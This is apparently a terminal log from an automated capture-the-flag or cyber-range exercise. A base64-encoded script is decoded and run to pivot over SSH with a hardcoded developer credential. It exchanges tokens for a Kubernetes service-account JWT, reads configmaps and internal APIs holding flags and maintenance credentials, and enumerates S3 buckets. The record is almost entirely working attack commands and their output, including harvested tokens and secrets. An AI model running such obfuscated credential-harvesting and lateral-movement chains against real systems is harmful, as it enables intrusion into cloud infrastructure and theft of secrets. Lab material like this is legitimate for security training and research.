@@ -1,0 +1,453 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r25.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKZXhwb3J0IEFXU19QQUdFUj0iIgpDQT0kSE9NRS8ubG9jYWwvc2hhcmUva2VwbGVyb3BzL2NhLmNydApCPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0Cks9aHR0cHM6Ly9jbG91ZC1hcGkua2VwbGVyb3BzLnRlc3Q6NjQ0MwpVPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpXVD0kKGN1cmwgLXNTayAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQplY2hvICJXVF9MRU4gJHsjV1R9IgpSPSQoY3VybCAtc1NrIC1tIDEwIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV1QiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS90b2tlbi1leGNoYW5nZS9maWVsZGtlc3QtZXhwb3J0LWFjY2VzcyIpCmVjaG8gIj09PSBFWENIQU5HRSBSRVNQT05TRSA9PT0iOyBlY2hvICIkUiIgfCBoZWFkIC1jIDIwMDA7IGVjaG8KRUo9JChlY2hvICIkUiIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb24KdHJ5OiBwcmludChqc29uLmxvYWQoc3lzLnN0ZGluKS5nZXQoImFjY2Vzc190b2tlbiIsIiIpKQpleGNlcHQgRXhjZXB0aW9uOiBwcmludCgiIiknKQplY2hvICJFSl9MRU4gJHsjRUp9IgppZiBbIC1uICIkRUoiIF07IHRoZW4KIHB5dGhvbjMgLSAiJEVKIiA8PCdQWScKaW1wb3J0IHN5cyxiYXNlNjQsanNvbgpwPXN5cy5hcmd2WzFdLnNwbGl0KCcuJykKZm9yIGkscyBpbiBlbnVtZXJhdGUocFs6Ml0pOgogICAgcys9Jz0nKigtbGVuKHMpJTQpCiAgICB0cnk6IHByaW50KGYiSldUW3tpfV0iLCBqc29uLmR1bXBzKGpzb24ubG9hZHMoYmFzZTY0LnVybHNhZmVfYjY0ZGVjb2RlKHMpKSxpbmRlbnQ9MSkpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6IHByaW50KCJqd3QgcGFydCBlcnIiLGUpClBZCmZpCmcoKXsgZWNobyAiIyMjIyMgJDEiOyBzaGlmdDsgY3VybCAtc1NrIC1tIDEyIC0tY2FjZXJ0ICRDQSAiJEAiIHwgaGVhZCAtYyA0MDAwOyBlY2hvOyB9CmcgImNvbmZpZ21hcCByb2xlLWV4cG9ydC1hY2Nlc3MiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEsvYXBpL3YxL25hbWVzcGFjZXMvZmllbGRsaW5rL2NvbmZpZ21hcHMvcm9sZS1leHBvcnQtYWNjZXNzIgpnICJjb25maWdtYXAgZXhwLTI4NDEtZGVmaW5pdGlvbiIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkSy9hcGkvdjEvbmFtZXNwYWNlcy9maWVsZGxpbmsvY29uZmlnbWFwcy9leHAtMjg0MS1kZWZpbml0aW9uIgpnICJhcGkgZXhwb3J0IEVYUC0yODQxIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRCL2FwaS9leHBvcnRzL0VYUC0yODQxIgpnICJhcGkgZXhwb3J0IGRlZmluaXRpb24iIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEIvYXBpL2V4cG9ydHMvRVhQLTI4NDEvZGVmaW5pdGlvbiIKZyAiYXBpIGV4cG9ydCBydW5zIEdFVCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkQi9hcGkvZXhwb3J0cy9FWFAtMjg0MS9ydW5zIgpnICJhcGkgcG9saWNpZXMgZGVmYXVsdCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkQi9hcGkvcG9saWNpZXMvZGVmYXVsdCIKZyAiYXBpIG1haW50ZW5hbmNlIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRCL2FwaS9tYWludGVuYW5jZSIKZWNobyAiPT09IFNTUlIgZXhwb3J0IEpXVCA9PT0iCmN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1YIFBPU1QgXAogLWQgJ3siYXBpVmVyc2lvbiI6ImF1dGhvcml6YXRpb24uazhzLmlvL3YxIiwia2luZCI6IlNlbGZTdWJqZWN0UnVsZXNSZXZpZXciLCJzcGVjIjp7Im5hbWVzcGFjZSI6ImZpZWxkbGluayJ9fScgXAogIiRLL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RydWxlc3Jldmlld3MiIHwgcHl0aG9uMyAtbSBqc29uLnRvb2wgMj4vZGV2L251bGwgfCBoZWFkIC0xNTAKZWNobyAiPT09IENPTkZJR01BUCBMSVNUIChsYWJlbCBzZWxlY3RvcnMpID09PSIKZm9yIHNlbCBpbiAiIiAiP2xhYmVsU2VsZWN0b3I9ZmllbGRrZXN0LmlvJTJGa2luZCUzRHJvbGUtcmVjb3JkIiAiP2xhYmVsU2VsZWN0b3I9ZmllbGRrZXN0LmlvJTJGa2luZCUzRHRydXN0LXJlY29yZCIgIj9sYWJlbFNlbGVjdG9yPWZpZWxka2VzdC5pbyUyRmtpbmQlM0RleHBvcnQtZGVmaW5pdGlvbiI7IGRvCiBlY2hvICItLSBzZWxlY3RvciAkc2VsIgogY3VybCAtc1NrIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRLL2FwaS92MS9uYW1lc3BhY2VzL2ZpZWxkbGluay9jb25maWdtYXBzJHNlbCIgfCBoZWFkIC1jIDE1MDA7IGVjaG8KZG9uZQplY2hvICI9PT0gUzMgLyBvYmplY3RzID09PSIKYXdzIC0tZW5kcG9pbnQtdXJsIGh0dHBzOi8vb2JqZWN0cy5rZXBsZXJvcHMudGVzdCAtLW5vLXZlcmlmeS1zc2wgczMgbHMgMj4mMSB8IGhlYWQgLTIwCmZvciBiIGluIGZpZWxka2VzdC1leHBvcnRzIGZpZWxkbGluay1leHBvcnRzIHN1cHBvcnQtZXhwb3J0cyBmaWVsZGtlc3Qtc3VwcG9ydCBzdXBwb3J0OyBkbwogZWNobyAiLS0gYnVja2V0ICRiIjsgYXdzIC0tZW5kcG9pbnQtdXJsIGh0dHBzOi8vb2JqZWN0cy5rZXBsZXJvcHMudGVzdCAtLW5vLXZlcmlmeS1zc2wgczMgbHMgInMzOi8vJGIiIDI+JjEgfCBoZWFkIC0xMApkb25lCmVjaG8gRE9ORV9SMjUKUlNICmVjaG8gRklOSVNIRUQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r25.sh; bash /tmp/k14_r25.sh; echo DONEMARK_1795207839359$((6*7))
+WT_LEN 984
+=== EXCHANGE RESPONSE ===
+{"accepted_input_audience":"fieldkest-build-records","access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk1MjExNDUxLCJpYXQiOjE3OTUyMDc4NTEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiODI5ZTc0MDUtNDVlMi00MGE5LTgyY2MtNGM5ODMyYjllZDBiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoic3ZjLWZpZWxkbGluay1leHBvcnQiLCJ1aWQiOiJkNzg0MDE1ZS1mYTAzLTQ3YTAtYTAyNy03ZDQ3MzcwZTRlMzcifX0sIm5iZiI6MTc5NTIwNzg1MSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmZpZWxkbGluazpzdmMtZmllbGRsaW5rLWV4cG9ydCJ9.axEAjGQG-yB6Xlmcw-acVRvpV7M7GEqdktq7aSACOaHJq7n85mFjGsI_EGTlTjTR8f7TbWKMPxTP6Zf3sSeuy-xIgSfQDOW31n9_KcZyzLT_szjW2GQD4yyczSUdookhraetZ8yblJfeX296G7Fzub5UMdHk28G4U8RUJ4CYAQYFl5TBOfjYcJXZI9QG3jsWRXsmM5xALmO9eLkrwQHCiANqC8qy2VJFq0nPDAO2v6F25PhPelRLfTGSppqg1u_AUfyFUsqZeJ2yA9td6km0h-erBilLPgOqVZU_rRfwJ15ZhH9_5qF4wjFdBvYE5KG06BzQ6-NHh2HZ6xz7M3VEgQ","audience":"fieldkest-export-access","expires_in":3600,"principal":"svc-fieldlink-export","role":"role/support-export-editor","schema":"fieldkest.role-session/v1"}
+
+EJ_LEN 978
+JWT[0] {
+ "alg": "RS256",
+ "kid": "iZzJJSHkL1jhKsVMrAxBLoPiW4eIZ45GrXkq5VeLfUw"
+}
+JWT[1] {
+ "aud": [
+  "https://kubernetes.default.svc.cluster.local",
+  "k3s"
+ ],
+ "exp": 1795211451,
+ "iat": 1795207851,
+ "iss": "https://kubernetes.default.svc.cluster.local",
+ "jti": "829e7405-45e2-40a9-82cc-4c9832b9ed0b",
+ "kubernetes.io": {
+  "namespace": "fieldlink",
+  "serviceaccount": {
+   "name": "svc-fieldlink-export",
+   "uid": "d784015e-fa03-47a0-a027-7d47370e4e37"
+  }
+ },
+ "nbf": 1795207851,
+ "sub": "system:serviceaccount:fieldlink:svc-fieldlink-export"
+}
+##### configmap role-export-access
+{
+  "kind": "ConfigMap",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "role-export-access",
+    "namespace": "fieldlink",
+    "uid": "6a19a19d-5a32-446f-9a19-a009684df9f1",
+    "resourceVersion": "10403",
+    "creationTimestamp": "2026-11-19T07:07:23Z",
+    "labels": {
+      "fieldkest.io/kind": "role-record"
+    },
+    "annotations": {
+      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"accepted_input_audience\":\"fieldkest-build-records\",\"audience\":\"fieldkest-export-access\",\"principal\":\"svc-fieldlink-export\",\"role_id\":\"role/support-export-editor\",\"schema\":\"fieldkest.role-record/v1\",\"scope\":\"fieldkest-exports\"},\"kind\":\"ConfigMap\",\"metadata\":{\"annotations\":{},\"labels\":{\"fieldkest.io/kind\":\"role-record\"},\"name\":\"role-export-access\",\"namespace\":\"fieldlink\"}}\n"
+    },
+    "managedFields": [
+      {
+        "manager": "kubectl-client-side-apply",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T07:07:23Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            ".": {},
+            "f:accepted_input_audience": {},
+            "f:audience": {},
+            "f:principal": {},
+            "f:role_id": {},
+            "f:schema": {},
+            "f:scope": {}
+          },
+          "f:metadata": {
+            "f:annotations": {
+              ".": {},
+              "f:kubectl.kubernetes.io/last-applied-configuration": {}
+            },
+            "f:labels": {
+              ".": {},
+              "f:fieldkest.io/kind": {}
+            }
+          }
+        }
+      },
+      {
+        "manager": "kubectl-patch",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T13:42:24Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            "f:access_token": {}
+          }
+        }
+      }
+    ]
+  },
+  "data": {
+    "accepted_input_audience": "fieldkest-build-records",
+    "access_token": "FLAG{f1aee508e418ac7c}",
+    "audience": "fieldkest-export-access",
+    "principal": "svc-fieldlink-export",
+    "role_id": "role/support-export-editor",
+    "schema": "fieldkest.role-record/v1",
+    "scope": "fieldkest-exports"
+  }
+}
+##### configmap exp-2841-definition
+{
+  "kind": "ConfigMap",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "exp-2841-definition",
+    "namespace": "fieldlink",
+    "uid": "1cdec28f-8741-4c1c-8999-899865e95206",
+    "resourceVersion": "54415",
+    "creationTimestamp": "2026-11-19T07:07:24Z",
+    "labels": {
+      "fieldkest.io/export-id": "EXP-2841",
+      "fieldkest.io/kind": "export-definition",
+      "fieldkest.io/owner": "maya.ranscombe"
+    },
+    "annotations": {
+      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"case_id\":\"CAS-MAYA-2841\",\"destinations\":\"[{\\\"name\\\":\\\"fieldkest-exports/EXP-2841-rowan\\\",\\\"owner\\\":\\\"rowan.ito\\\"},{\\\"name\\\":\\\"fieldkest-exports/EXP-2841-maya\\\",\\\"owner\\\":\\\"maya.ranscombe\\\"}]\",\"export_id\":\"EXP-2841\",\"owner\":\"maya.ranscombe\",\"partition_bindings\":\"[{\\\"partition\\\":\\\"PART-ARWC-01\\\",\\\"current\\\":true,\\\"tenant\\\":\\\"TEN-ARWC-019\\\",\\\"tenant_id\\\":\\\"TEN-ARWC-019\\\",\\\"connector_revision\\\":\\\"FLK-7.4.2\\\",\\\"revision\\\":6},{\\\"partition\\\":\\\"PART-ARWC-02\\\",\\\"current\\\":false,\\\"tenant\\\":\\\"TEN-OTHER-001\\\",\\\"tenant_id\\\":\\\"TEN-OTHER-001\\\",\\\"connector_revision\\\":\\\"FLK-7.3.1\\\",\\\"revision\\\":5}]\",\"partitions\":\"[\\\"PART-ARWC-01\\\"]\",\"schema\":\"fieldkest.export-definition/v1\",\"tenant\":\"TEN-ARWC-019\"},\"kind\":\"ConfigMap\",\"metadata\":{\"annotations\":{},\"labels\":{\"fieldkest.io/export-id\":\"EXP-2841\",\"fieldkest.io/kind\":\"export-definition\",\"fieldkest.io/owner\":\"maya.ranscombe\"},\"name\":\"exp-2841-definition\",\"namespace\":\"fieldlink\"}}\n"
+    },
+    "managedFields": [
+      {
+        "manager": "kubectl-client-side-apply",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T07:07:24Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            ".": {},
+            "f:case_id": {},
+            "f:destinations": {},
+            "f:export_id": {},
+            "f:owner": {},
+            "f:partitions": {},
+            "f:schema": {}
+          },
+          "f:metadata": {
+            "f:annotations": {
+              ".": {},
+              "f:kubectl.kubernetes.io/last-applied-configuration": {}
+            },
+            "f:labels": {
+              ".": {},
+              "f:fieldkest.io/export-id": {},
+              "f:fieldkest.io/kind": {},
+              "f:fieldkest.io/owner": {}
+            }
+          }
+        }
+      },
+      {
+        "manager": "kubectl-patch",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T13:42:23Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            "f:access_token": {}
+          }
+        }
+      },
+      {
+        "manager": "unknown",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-20T19:32:32Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            "f:destination": {},
+            "f:revision": {}
+          }
+        }
+      },
+      {
+        "manager": "curl",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-20T19:42:58Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            "f:partition_bindings": {},
+            "f:tenant": {},
+            "f:tenant_id": {}
+          }
+        }
+      }
+    ]
+  },
+  "data": {
+    "access_token": "FLAG{bd60dc9d170bc2c7}",
+    "case_id": "CAS-MAYA-2841",
+    "destination": "fieldkest-exports/EXP-2841-rowan",
+    "destinations": "[{\"name\":\"fieldkest-exports/EXP-2841-rowan\",\"owner\":\"rowan.ito\"},{\"name\":\"fieldkest-exports/EXP-2841-maya\",\"owner\":\"maya.ranscombe\"}]",
+    "export_id": "EXP-2841",
+    "owner": "maya.ranscombe",
+    "partition_bindings": "[{\"partition\":\"PART-ARWC-01\",\"current\":true,\"tenant\":\"TEN-ARWC-047\",\"tenant_id\":\"TEN-ARWC-047\",\"connector_revision\":\"FLK-7.4.2\",\"revi
+##### api export EXP-2841
+{"case_id":"CAS-MAYA-2841","dataset":"support-case-history","destination":"fieldkest-exports","export_id":"EXP-2841","flag":"FLAG{6b4342f2b090f8d2}","job_name":"exp-2841","revision":6,"schema":"fieldkest.export-job/v1","state":"unpublished"}
+
+##### api export definition
+{"case_id":"CAS-MAYA-2841","destinations":[{"name":"fieldkest-exports/EXP-2841-rowan","owner":"rowan.ito"},{"name":"fieldkest-exports/EXP-2841-maya","owner":"maya.ranscombe"}],"export_id":"EXP-2841","flag":"FLAG{bd60dc9d170bc2c7}","owner":"maya.ranscombe","partition_bindings":[{"connector_revision":"FLK-7.4.2","current":true,"partition":"PART-ARWC-01","revision":6,"tenant":"TEN-ARWC-047","tenant_id":"TEN-ARWC-047"},{"connector_revision":"FLK-7.3.1","current":false,"partition":"PART-ARWC-02","revision":5,"tenant":"TEN-OTHER-001","tenant_id":"TEN-OTHER-001"}],"partitions":["PART-ARWC-01"],"schema":"fieldkest.export-definition/v1","tenant":"TEN-ARWC-047"}
+
+##### api export runs GET
+{"error":"k3s_rbac_denied"}
+
+##### api policies default
+{"error":"k3s_rbac_denied"}
+
+##### api maintenance
+{"archive_asset":"CRR-OG2","field_archive":"FIELD-CRR-2026-09","policy_id":"fieldlink-maintenance","runtime_credential":"fk_maintenance_runtime_3gIP3j8w6fhkBSqv7J5xllOrDVa2Kzig","worker_credential":"fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ","workload_class":"maintenance","workload_id":"MAINT-FLK-01"}
+
+=== SSRR export JWT ===
+{
+    "kind": "SelfSubjectRulesReview",
+    "apiVersion": "authorization.k8s.io/v1",
+    "metadata": {},
+    "spec": {},
+    "status": {
+        "resourceRules": [
+            {
+                "verbs": [
+                    "get",
+                    "list",
+                    "watch"
+                ],
+                "apiGroups": [
+                    "certificates.k8s.io"
+                ],
+                "resources": [
+                    "clustertrustbundles"
+                ]
+            },
+            {
+                "verbs": [
+                    "create"
+                ],
+                "apiGroups": [
+                    "authorization.k8s.io"
+                ],
+                "resources": [
+                    "selfsubjectaccessreviews",
+                    "selfsubjectrulesreviews"
+                ]
+            },
+            {
+                "verbs": [
+                    "create"
+                ],
+                "apiGroups": [
+                    "authentication.k8s.io"
+                ],
+                "resources": [
+                    "selfsubjectreviews"
+                ]
+            },
+            {
+                "verbs": [
+                    "get"
+                ],
+                "apiGroups": [
+                    ""
+                ],
+                "resources": [
+                    "configmaps"
+                ],
+                "resourceNames": [
+                    "role-export-access"
+                ]
+            },
+            {
+                "verbs": [
+                    "get"
+                ],
+                "apiGroups": [
+                    "batch"
+                ],
+                "resources": [
+                    "jobs"
+                ],
+                "resourceNames": [
+                    "exp-2841"
+                ]
+            },
+            {
+                "verbs": [
+                    "get"
+                ],
+                "apiGroups": [
+                    ""
+                ],
+                "resources": [
+                    "configmaps"
+                ],
+                "resourceNames": [
+                    "exp-2841-definition"
+                ]
+            },
+            {
+                "verbs": [
+                    "patch"
+                ],
+                "apiGroups": [
+                    ""
+                ],
+                "resources": [
+                    "configmaps"
+                ],
+                "resourceNames": [
+                    "exp-2841-definition"
+                ]
+            },
+            {
+                "verbs": [
+                    "get"
+                ],
+                "apiGroups": [
+                    "batch"
+                ],
+                "resources": [
+                    "cronjobs"
+                ],
+                "resourceNames": [
+                    "sched-2841"
+                ]
+            },
+            {
+                "verbs": [
+                    "patch"
+                ],
+                "apiGroups": [
+                    "batch"
+                ],
+                "resources": [
+                    "cronjobs"
+                ],
+                "resourceNames": [
+                    "sched-2841"
+                ]
+            },
+            {
+                "verbs": [
+                    "create",
+                    "get"
+                ],
+                "apiGroups": [
+                    "batch"
+                ],
+                "resources": [
+                    "jobs"
+                ]
+            }
+        ],
+        "nonResourceRules": [
+            {
+                "verbs": [
+                    "get"
+                ],
+                "nonResourceURLs": [
+                    "/api",
+                    "/api/*",
+                    "/apis",
+                    "/apis/*",
+=== CONFIGMAP LIST (label selectors) ===
+-- selector 
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot list resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+-- selector ?labelSelector=fieldkest.io%2Fkind%3Drole-record
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot list resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+-- selector ?labelSelector=fieldkest.io%2Fkind%3Dtrust-record
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot list resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+-- selector ?labelSelector=fieldkest.io%2Fkind%3Dexport-definition
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot list resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+=== S3 / objects ===
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1065: InsecureRequestWarning: Unverified HTTPS request is being made to host 'objects.keplerops.test'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+2026-11-19 07:11:39 fieldlink-exports
+-- bucket fieldkest-exports
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1065: InsecureRequestWarning: Unverified HTTPS request is being made to host 'objects.keplerops.test'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied.
+-- bucket fieldlink-exports
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1065: InsecureRequestWarning: Unverified HTTPS request is being made to host 'objects.keplerops.test'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+                           PRE backups/
+-- bucket support-exports
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1065: InsecureRequestWarning: Unverified HTTPS request is being made to host 'objects.keplerops.test'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied.
+-- bucket fieldkest-support
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1065: InsecureRequestWarning: Unverified HTTPS request is being made to host 'objects.keplerops.test'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied.
+-- bucket support
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1065: InsecureRequestWarning: Unverified HTTPS request is being made to host 'objects.keplerops.test'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied.
+DONE_R25
+FINISHED
